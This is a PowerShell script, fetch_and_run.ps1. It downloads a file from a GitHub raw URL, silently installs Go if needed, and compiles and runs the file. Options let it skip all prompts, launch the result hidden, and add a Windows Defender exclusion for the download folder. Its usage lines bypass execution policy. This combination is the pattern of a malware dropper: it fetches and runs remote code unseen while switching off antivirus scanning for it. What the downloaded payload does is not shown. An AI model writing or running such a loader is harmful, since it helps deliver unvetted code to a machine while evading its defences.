<#
fetch_and_run.ps1
- Downloads a given URL to a local folder
- Optionally installs Go silently to a system-wide location and adds to PATH (requires admin)
- Runs or extracts the downloaded artifact appropriately, with special handling for Go files without extensions
- Adds a Defender exclusion for the file/folder optionally (requires admin)
- Logs actions to %TEMP%\download_runner.log

USAGE (interactive):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1

USAGE (auto, no prompts):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1 -Auto

Edit $remoteUrl below or pass -Url parameter. For private repos, set $env:GITHUB_PAT.
#>

param(
    [string]$Url = "",
    [switch]$Auto,               # if true, skip interactive prompts and proceed
    [switch]$InstallGo,          # if true, download & install Go silently (requires admin)
    [string]$DestFolder = "",    # optional output folder
    [switch]$AddDefenderExclusion, # add Defender exclusion for dest folder or downloaded file (requires admin)
    [switch]$RunHidden           # start exe hidden
)

# -------------------------
# Config - edit if needed
# -------------------------
if (-not $Url -or $Url.Trim() -eq "") {
    # Default: your GitHub raw URL (private repo requires PAT)
    $Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile"
    if ($env:GITHUB_PAT) {
        $Url = $Url -replace "https://", "https://$($env:GITHUB_USER):$($env:GITHUB_PAT)@"
    }
}

$LogFile = Join-Path $env:TEMP "download_runner.log"
function Log { param($m) $line = "$(Get-Date -Format o) - $m"; Add-Content -Path $LogFile -Value $line; Write-Output $line }

# Ensure destination folder
if (-not $DestFolder -or $DestFolder.Trim() -eq "") {
    $DestFolder = Join-Path $env:USERPROFILE "Downloads\fetch_and_run"
}
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null }

# Helper: ensure admin
function Test-IsAdmin { 
    try { (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false } 
}

# Helper: download file robustly
function Download-File($sourceUrl, $outPath) {
    Log "Downloading $sourceUrl -> $outPath"
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $sourceUrl -OutFile $outPath -UseBasicParsing -ErrorAction Stop
        Log "Downloaded successfully"
        return $true
    } catch {
        Log "Download failed: $_"
        return $false
    } finally {
        $ProgressPreference = 'Continue'
    }
}

# Helper: run exe (hidden optional)
function Run-Exe($path, $args = "", $hidden = $true) {
    Log "Launching executable: $path $args"
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $path
    $si.Arguments = $args
    $si.UseShellExecute = $false
    if ($hidden) { $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden }
    [System.Diagnostics.Process]::Start($si) | Out-Null
}

# Helper: add Defender exclusion (folder or file)
function Add-DefenderExclusion($path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not running as admin"
        return $false
    }
    try {
        Log "Adding Windows Defender exclusion for $path"
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Helper: add path to system PATH environment variable
function Add-ToSystemPath($path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot modify system PATH: not running as admin"
        return $false
    }
    try {
        $currentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($currentPath -notlike "*$path*") {
            Log "Adding $path to system PATH"
            $newPath = $currentPath + ";$path"
            [Environment]::SetEnvironmentVariable("Path", $newPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            return $true
        } else {
            Log "$path already in system PATH"
            return $true
        }
    } catch {
        Log "Failed to update system PATH: $_"
        return $false
    }
}

# Optional: download & install Go silently (MSI) to system-wide location
function Install-GoSilent {
    if (-not (Test-IsAdmin)) {
        Log "Install-GoSilent: admin required but not admin. Aborting Go install."
        Write-Host "Error: Run this script as Administrator to install Go."
        return $false
    }
    $goVersion = "1.23.2"
    $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    $msiName = "go$goVersion.windows-$arch.msi"
    $msiUrl = "https://go.dev/dl/$msiName"
    $msiPath = Join-Path $DestFolder $msiName
    $goInstallDir = "C:\Program Files\Go"

    $goBin = Join-Path $goInstallDir "bin\go.exe"
    if (Test-Path $goBin) {
        Log "Go already installed at $goInstallDir"
        Write-Host "Go is already installed."
        return $true
    }

    Log "Downloading Go MSI $msiUrl to $msiPath"
    Write-Host "Downloading Go $goVersion... (this may take 30-60 seconds)"
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing -ErrorAction Stop
        Log "Downloaded Go MSI successfully"
    } catch {
        Log "Go MSI download failed: $_"
        Write-Host "Download failed. Check log at $LogFile"
        return $false
    } finally {
        $ProgressPreference = 'Continue'
    }

    if (-not (Test-Path $msiPath)) {
        Log "Go MSI not found at $msiPath"
        Write-Host "Error: Go MSI not downloaded."
        return $false
    }

    Log "Starting silent install of Go via msiexec to $goInstallDir"
    Write-Host "Installing Go to $goInstallDir... (please approve any UAC prompt)"
    $args = "/i `"$msiPath`" /qn /norestart INSTALLDIR=`"$goInstallDir`""
    try {
        $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru -ErrorAction Stop
        if ($proc.ExitCode -eq 0) {
            Log "Go installed successfully to $goInstallDir"
            Write-Host "Go installation complete."
            $goBinPath = Join-Path $goInstallDir "bin"
            Add-ToSystemPath $goBinPath | Out-Null
            [Environment]::SetEnvironmentVariable("GOROOT", $goInstallDir, [System.EnvironmentVariableTarget]::Machine)
            Log "GOROOT set to $goInstallDir"
            return $true
        } else {
            Log "Go msiexec returned exit code $($proc.ExitCode)"
            Write-Host "Go installation failed with exit code $($proc.ExitCode). Check log at $LogFile"
            return $false
        }
    } catch {
        Log "msiexec failed: $_"
        Write-Host "Error during Go installation: $_"
        return $false
    }
}

# Helper: compile and run Go program
function Run-GoProgram($goFilePath) {
    Log "Detected Go source file: $goFilePath"
    $goExe = "go"
    if (-not (Get-Command $goExe -ErrorAction SilentlyContinue)) {
        Log "Go not found in PATH. Attempting to install Go."
        if (-not (Install-GoSilent)) {
            Log "Failed to install Go. Cannot compile Go program."
            Write-Host "Error: Go installation failed. Check log at $LogFile"
            return $false
        }
    }
    $exePath = [System.IO.Path]::ChangeExtension($goFilePath, ".exe")
    Log "Compiling Go program: $goFilePath -> $exePath"
    Write-Host "Compiling Go program (may take 10-60 seconds due to dependency downloads)..."
    try {
        $proc = Start-Process -FilePath $goExe -ArgumentList "build","-o",$exePath,$goFilePath -Wait -PassThru -NoNewWindow -ErrorAction Stop
        if ($proc.ExitCode -eq 0) {
            Log "Compilation successful. Running $exePath"
            Write-Host "Starting Go program..."
            Run-Exe -path $exePath -hidden:$RunHidden
            return $true
        } else {
            Log "Go build failed with exit code $($proc.ExitCode)"
            Write-Host "Go compilation failed. Check log at $LogFile"
            return $false
        }
    } catch {
        Log "Go build error: $_"
        Write-Host "Error during Go compilation: $_"
        return $false
    }
}

# -------------------------
# Begin main
# -------------------------
Log "fetch_and_run started. DestFolder: $DestFolder  Url: $Url"

# Convert GitHub blob URL to raw if user passed blob URL
if ($Url -match "github.com/.+/blob/(.+)$") {
    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
    if ($env:GITHUB_PAT) {
        $Url = $Url -replace "https://", "https://$($env:GITHUB_USER):$($env:GITHUB_PAT)@"
    }
    Log "Detected GitHub blob URL, converted to raw URL: $Url"
}

# Get filename from URL (fallback to privatefile with .go extension)
$uri = [System.Uri]$Url
$fname = [System.IO.Path]::GetFileName($uri.AbsolutePath)
if (-not $fname -or $fname.Trim() -eq "") { $fname = "privatefile.go" }
elseif (-not $fname.EndsWith(".go")) { $fname = "$fname.go" }
$destPath = Join-Path $DestFolder $fname

# Confirm with user unless Auto
if (-not $Auto) {
    Write-Host "About to download:`n $Url`nTo:`n $destPath`n"
    $do = Read-Host "Proceed? Y/N"
    if ($do.ToUpper() -ne "Y") { Log "User cancelled"; exit 0 }
}

# Download file
if (-not (Download-File $Url $destPath)) {
    Log "Download failed. Exiting."
    Write-Host "Error: Failed to download $Url. Check log at $LogFile"
    exit 1
}

# If user requested Go install
if ($InstallGo) {
    if (-not $Auto) {
        $yn = Read-Host "Install Go on this machine now? This requires admin. Y/N"
        if ($yn.ToUpper() -ne "Y") { Log "Skipped Go install per user"; }
        else { Install-GoSilent | Out-Null }
    } else {
        Install-GoSilent | Out-Null
    }
}

# Add Defender exclusion if requested
if ($AddDefenderExclusion) {
    if (-not (Test-IsAdmin)) {
        Log "Warning: adding Defender exclusion requires admin. Please re-run as admin to add exclusion."
        Write-Host "Warning: Defender exclusion requires admin privileges."
    } else {
        Add-DefenderExclusion $DestFolder | Out-Null
    }
}

# Act depending on file type
$ext = [System.IO.Path]::GetExtension($destPath).ToLowerInvariant()
if ($ext -eq ".go" -or $fname -eq "privatefile.go") {
    Log "Detected Go source file: $destPath"
    if (-not $Auto) {
        Write-Host "Downloaded Go source file to $destPath"
        $r = Read-Host "Compile and run the Go program now? Y/N"
        if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; exit 0 }
    }
    Run-GoProgram $destPath
} else {
    Log "Unknown extension ($ext). Assuming Go source file."
    Write-Host "Assuming downloaded file is Go source code."
    $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
    try {
        Rename-Item -Path $destPath -NewName $goPath -Force -ErrorAction Stop
        Log "Renamed $destPath to $goPath"
    } catch {
        Log "Failed to rename file to $goPath: $_"
        Write-Host "Error: Could not rename file to $goPath"
        exit 1
    }
    if (-not $Auto) {
        Write-Host "Renamed file to $goPath"
        $r = Read-Host "Compile and run the Go program now? Y/N"
        if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; exit 0 }
    }
    Run-GoProgram $goPath
}

Log "fetch_and_run finished."
